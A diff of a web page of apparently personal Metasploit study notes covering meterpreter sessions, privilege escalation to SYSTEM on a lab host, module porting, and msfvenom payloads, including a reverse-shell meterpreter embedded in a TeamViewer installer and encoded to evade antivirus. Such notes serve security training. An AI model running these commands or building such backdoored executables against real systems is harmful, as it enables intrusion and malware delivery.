 <p>Usually, these modules can be found in the <code>post</code> category, referring to Post-Exploitation modules. The main archetypes of modules in this category consist of credential gatherers, local exploit suggesters, and internal scanners.</p>
 <h3 id="jobs"><a class="header" href="#jobs">Jobs</a></h3>
 <p>If, for example, you are running an active exploit under a specific port and need this port for a different moduel, you cannot simply terminate the session. If you did that, you would see that the port would still be in use, affecting your use of the new module. So instead, you would need to use the <code>jobs</code> command to look at the currently active tasks running in the background and terminate the old ones to free up the port.</p>
@@ -2209,7 +2218,7 @@ msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run
 
 meterpreter &gt;
 </code></pre>
-<p>You have your meterpreter shell. However, you can see a .asp file named "metasploit28857905" on the target at this very moment. Once the meterpreter shell is obtained, it will reside within the memory. Therefore, the file is not needed, and removal was attempted by msfconsole, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.</p>
+<p>You have your meterpreter shell. However, you can see a .asp file named “metasploit28857905” on the target at this very moment. Once the meterpreter shell is obtained, it will reside within the memory. Therefore, the file is not needed, and removal was attempted by msfconsole, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.</p>
 <h4 id="msf---meterpreter-migration"><a class="header" href="#msf---meterpreter-migration">MSF - Meterpreter Migration</a></h4>
 <pre><code class="language-bash">meterpreter &gt; getuid
 
@@ -2249,7 +2258,7 @@ meterpreter &gt; getuid
 
 Server username: NT AUTHORITY\NETWORK SERVICE
 </code></pre>
-<p>Now that you have established at least some privilege level in the system, it is time to escalate that privilege. So, you look around for anything interesting, and in the <code>C:\inetpub\</code> location, you find an interesting folder named "AdminScripts". However, unfortunately, you do not have permission to read what is inside it.</p>
+<p>Now that you have established at least some privilege level in the system, it is time to escalate that privilege. So, you look around for anything interesting, and in the <code>C:\inetpub\</code> location, you find an interesting folder named “AdminScripts”. However, unfortunately, you do not have permission to read what is inside it.</p>
 <h4 id="msf---interacting-with-the-target"><a class="header" href="#msf---interacting-with-the-target">MSF - Interacting with the Target</a></h4>
 <pre><code>c:\Inetpub&gt;dir
 
@@ -2319,7 +2328,7 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [*] Post module execution completed
 msf6 post(multi/recon/local_exploit_suggester) &gt; 
 </code></pre>
-<p>Running the recon module presents you with a multitude of options. Going through each separate one, you land on the "ms15_051_client_copy_image" entry, which proves to be successful. This exploit lands you directly within a root shell, giving you total control over the target system.</p>
+<p>Running the recon module presents you with a multitude of options. Going through each separate one, you land on the “ms15_051_client_copy_image” entry, which proves to be successful. This exploit lands you directly within a root shell, giving you total control over the target system.</p>
 <h4 id="msf---privesc"><a class="header" href="#msf---privesc">MSF - PrivEsc</a></h4>
 <pre><code class="language-bash">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images
 
@@ -2519,7 +2528,7 @@ Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\Local
 <p>To install any new metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole.</p>
 <p>However, if you need only a specific module and do not want to perform a full upgrade, you can download that module and install it manually. You will focus on searching ExploitDB for readily available metasploit modules, which you can directly import into your version of msfconsole locally.</p>
 <h3 id="example-nagios3"><a class="header" href="#example-nagios3">Example Nagios3</a></h3>
-<p>Let's say you want to use an exploit for Nagios3, which will take advantage of a command injection vuln. The module you are looking for is "Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)". So you fire up msfconsole and try to search for that specific exploit, but you cannot find it. This means that your metasploit framework is not up to date or that the specific Nagios3 exploit module you are looking for is not in the official update release.</p>
+<p>Let’s say you want to use an exploit for Nagios3, which will take advantage of a command injection vuln. The module you are looking for is “Nagios3 - ‘statuswml.cgi’ Command Injection (Metasploit)”. So you fire up msfconsole and try to search for that specific exploit, but you cannot find it. This means that your metasploit framework is not up to date or that the specific Nagios3 exploit module you are looking for is not in the official update release.</p>
 <h4 id="msf---search-for-exploits"><a class="header" href="#msf---search-for-exploits">MSF - Search for Exploits</a></h4>
 <pre><code class="language-bash">msf6 &gt; search nagios
 
@@ -2537,7 +2546,7 @@ Matching Modules
    6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
    7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
 </code></pre>
-<p>You can, however, find the exploit code inside ExploitDB's entries. Alternatively, if you do not want to use your web browser to search for a specific exploit within ExploitDB, you can use the CLI version, searchsploit.</p>
+<p>You can, however, find the exploit code inside ExploitDB’s entries. Alternatively, if you do not want to use your web browser to search for a specific exploit within ExploitDB, you can use the CLI version, searchsploit.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ searchsploit nagios3
 
 --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -2617,7 +2626,7 @@ Exploit target:
 </code></pre>
 <h3 id="porting-over-scripts-into-metasploit-modules"><a class="header" href="#porting-over-scripts-into-metasploit-modules">Porting Over Scripts into Metasploit Modules</a></h3>
 <p>To adapt a custom Python, PHP, or any type of exploit script to a Ruby module for metasploit, you will need to learn the Ruby programming language. Note that Ruby modules for metasploit are always written using hard tabs.</p>
-<p>You start by picking some exploit code to port over to metasploit. In this example, you will go for "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass". You will need to download the script, 48746.rb and proceed to copy it into the <code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code> folder. If you boot into msfconsole right now, you will only be able to find a single Bludit CMS exploit in the same folder as above, confirming that your exploit has not been ported over yet. It is good news that there is already a Bludit exploit in that folder because you will use it as boilerplate code for your new exploit.</p>
+<p>You start by picking some exploit code to port over to metasploit. In this example, you will go for “Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass”. You will need to download the script, 48746.rb and proceed to copy it into the <code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code> folder. If you boot into msfconsole right now, you will only be able to find a single Bludit CMS exploit in the same folder as above, confirming that your exploit has not been ported over yet. It is good news that there is already a Bludit exploit in that folder because you will use it as boilerplate code for your new exploit.</p>
 <h4 id="porting-msf-modules"><a class="header" href="#porting-msf-modules">Porting MSF Modules</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
 
@@ -2648,12 +2657,18 @@ class MetasploitModule &lt; Msf::Exploit::Remote
   include Msf::Auxiliary::Report
 </code></pre>
 <p>You can look at the <code>include</code> statements to see what each one does. This can be done by cross-referencing them with the rubydoc rapid7 documentation. Below are their respective functions as explained in the documentation:</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Description</th></tr>
+</thead>
+<tbody>
 <tr><td><code>Msf::Exploit::Remote::HttpClient</code></td><td>this module provides methods for acting as an HTTP client when exploiting an HTTP server</td></tr>
 <tr><td><code>Msf::Exploit::PhpEXE</code></td><td>this is a method for generating a first-stage php payload</td></tr>
 <tr><td><code>Msf::Exploit::FileDropper</code></td><td>this method transfers files and handles file clean-up after a session with the target is established</td></tr>
 <tr><td><code>Msf::Auxiliary::Report</code></td><td>this module provides methods for reporting data to the MSF DB</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <p>Looking at their purposes above, you conclude that you will not need the FileDropper method, and you can drop it from the final module code.</p>
 <p>You see that there are different sections dedicated to the <code>info</code> page of the module, the <code>options</code> section. You fill them in appropriately, offering the credit due to the individuals who discovered the exploit, the CVE information, and other relevant details.</p>
@@ -2823,7 +2838,7 @@ end
 <h2 id="introduction-to-msfvenom"><a class="header" href="#introduction-to-msfvenom">Introduction to MSFVenom</a></h2>
 <p>MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.</p>
 <h3 id="creating-you-payloads"><a class="header" href="#creating-you-payloads">Creating you Payloads</a></h3>
-<p>Suppose you have found an open FTP port that either had weak creds or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a webs service running on port tcp/80 of the same machine and that all of the files found in the FTP root dir can be viewed in the web-service's <code>/uploads</code> dir. Also suppose that the web service does not have any checks for what you are allowed to run on it as a client.</p>
+<p>Suppose you have found an open FTP port that either had weak creds or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a webs service running on port tcp/80 of the same machine and that all of the files found in the FTP root dir can be viewed in the web-service’s <code>/uploads</code> dir. Also suppose that the web service does not have any checks for what you are allowed to run on it as a client.</p>
 <p>Suppose you are hypothetically allowed to call anything from the web service. In that case, you can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing you to receive a reverse TCP connection from the victim machine.</p>
 <h4 id="scanning-the-target"><a class="header" href="#scanning-the-target">Scanning the Target</a></h4>
 <pre><code class="language-bash">d41y@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
@@ -2931,7 +2946,7 @@ meterpreter &gt;
 [*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
 </code></pre>
 <h3 id="local-exploit-suggester"><a class="header" href="#local-exploit-suggester">Local Exploit Suggester</a></h3>
-<p>There is a module called the "Local Exploit Suggester". You will be using this module for this example, as the meterpreter shell landed on the IIS APPOOL\Web user, which naturally does not have many permissions. Furthermore, running the <code>sysinfo</code> command shows you that the system is of x86 bit architecture, giving you even more reason to trust the Local Exploit Suggester.</p>
+<p>There is a module called the “Local Exploit Suggester”. You will be using this module for this example, as the meterpreter shell landed on the IIS APPOOL\Web user, which naturally does not have many permissions. Furthermore, running the <code>sysinfo</code> command shows you that the system is of x86 bit architecture, giving you even more reason to trust the Local Exploit Suggester.</p>
 <h4 id="msf---searching-for-local-exploit-suggester"><a class="header" href="#msf---searching-for-local-exploit-suggester">MSF - Searching for Local Exploit Suggester</a></h4>
 <pre><code class="language-bash">msf6 &gt; search local exploit suggester
 
@@ -2976,7 +2991,7 @@ msf6 post(multi/recon/local_exploit_suggester) &gt; run
 [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 [*] Post module execution completed
 </code></pre>
-<p>Having these results in front of you, you can easily pick one of them to test out. If the one you chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, <code>bypassauc_eventvwr</code> fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, <code>ms10_015_kitrap0d</code>, does the trick.</p>
+<p>Having these results in front of you, you can easily pick one of them to test out. If the one you chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, <code>bypassauc_eventvwr</code> fails due to the IIS user not being a part of the administrator’s group, which is the default and expected. The second option, <code>ms10_015_kitrap0d</code>, does the trick.</p>
 <h4 id="msf---local-privesc"><a class="header" href="#msf---local-privesc">MSF - Local PrivEsc</a></h4>
 <pre><code class="language-bash">msf6 exploit(multi/handler) &gt; search kitrap0d
 
@@ -3044,13 +3059,13 @@ Server username: NT AUTHORITY\SYSTEM
 </code></pre>
 <h2 id="firewall-and-idsips-evasion"><a class="header" href="#firewall-and-idsips-evasion">Firewall and IDS/IPS Evasion</a></h2>
 <h3 id="endpoint-protection"><a class="header" href="#endpoint-protection">Endpoint Protection</a></h3>
-<p>... refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone.</p>
+<p>… refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network’s De-Militarized Zone.</p>
 <p>Endpoint protection usually comes in the form of software packs which include Antivirus Protection, Antimalware Protection, Firewall, and Anti-DDoS all in one, under the same software package. You are better familiarized with this form than the latter, as most of you are running endpoint protection software on your PCs at home or the workstations at your workplace.</p>
 <h3 id="perimeter-protection"><a class="header" href="#perimeter-protection">Perimeter Protection</a></h3>
-<p>... usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.</p>
-<p>Between these two zones, on some occasions, you will also find a third one, called the DMZ. This is a lower-security policy level zone than the inside networks', but with a higher trust level than the outside zone, which is the vast internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.</p>
+<p>… usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.</p>
+<p>Between these two zones, on some occasions, you will also find a third one, called the DMZ. This is a lower-security policy level zone than the inside networks’, but with a higher trust level than the outside zone, which is the vast internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.</p>
 <h3 id="security-policies"><a class="header" href="#security-policies">Security Policies</a></h3>
-<p>... are the drive behind every well-maintained security posture of any network. They function the same way as ACL do. They are essentially a list of <code>allow</code> and <code>deny</code> statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside.</p>
+<p>… are the drive behind every well-maintained security posture of any network. They function the same way as ACL do. They are essentially a list of <code>allow</code> and <code>deny</code> statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside.</p>
 <h3 id="evasion-techniques"><a class="header" href="#evasion-techniques">Evasion Techniques</a></h3>
 <p>Msfvenom offers the option of using executable templates. This allows you to use some pre-set templates for executable files, inject your payload into them, and use any executable as a platform from which you can launch your attack. You can embed the shellcode into any installer, package, or programm that you have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatyl obfuscates your malicious code and, more importantly, lowers your detection chances. There are many valid combinations between actual, legitimate executable files, your different encoding schemes, and your different payload shellcode variants. This generates what is called a backdoored executable.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
@@ -3067,7 +3082,7 @@ x86/shikata_ga_nai chosen with final size 135
 Payload size: 135 bytes
 Saved as: /home/user/Desktop/TeamViewer_Setup.exe
 </code></pre>
-<p>... and:</p>
+<p>… and:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ ls
 
 Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
@@ -3090,7 +3105,7 @@ x86/shikata_ga_nai chosen with final size 135
 Payload size: 135 bytes
 Saved as: /home/user/test.js
 </code></pre>
-<p>... and:</p>
+<p>… and:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ cat test.js
 
 �+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs&gt;��Z*�����9vt��%��1�
@@ -3310,7 +3325,7 @@ test   test2   test.js
 </code></pre>
 <p>As you can see from the above, this is an excellent way to transfer data both to and from the target host.</p>
 <h3 id="packers"><a class="header" href="#packers">Packers</a></h3>
-<p>The term "packer" refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.</p>
+<p>The term “packer” refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.</p>
 <p>Popular packer software:</p>
 <ul>
 <li>UPX packer</li>
@@ -3320,20 +3335,19 @@ test   test2   test.js
 <li>ExeStealth</li>
 <li>Morphine</li>
 <li>MEW</li>
-<li>Themida<!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --></li>
+<li>Themida</li>
 </ul>
-<div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
-<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2026 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
                             <a rel="prev" href="../../attack/tools/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                                <i class="fa fa-angle-left"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                             </a>
 
                             <a rel="next prefetch" href="../../attack/tools/nmap.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                                <i class="fa fa-angle-right"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                             </a>
 
                         <div style="clear: both"></div>
@@ -3343,15 +3357,21 @@ test   test2   test.js
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
                     <a rel="prev" href="../../attack/tools/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                        <i class="fa fa-angle-left"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                     </a>
 
                     <a rel="next prefetch" href="../../attack/tools/nmap.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                        <i class="fa fa-angle-right"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                     </a>
             </nav>
 
         </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
 
         <!-- Livereload script (if served using the cli tool) -->
         <script>
@@ -3371,22 +3391,20 @@ test   test2   test.js
         </script>
 
 
-
         <script>
             window.playground_copyable = true;
         </script>
 
 
-        <script src="../../elasticlunr.min.js"></script>
-        <script src="../../mark.min.js"></script>
-        <script src="../../searcher.js"></script>
+        <script src="../../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../../mark-09e88c2c.min.js"></script>
+        <script src="../../searcher-c2a407aa.js"></script>
 
-        <script src="../../clipboard.min.js"></script>
-        <script src="../../highlight.js"></script>
-        <script src="../../book.js"></script>
+        <script src="../../clipboard-1626706a.min.js"></script>
+        <script src="../../highlight-abc7f01d.js"></script>
+        <script src="../../book-a0b12cfe.js"></script>
 
         <!-- Custom JS scripts -->
-        <script src="../../theme/pagetoc.js"></script>
 
 
 
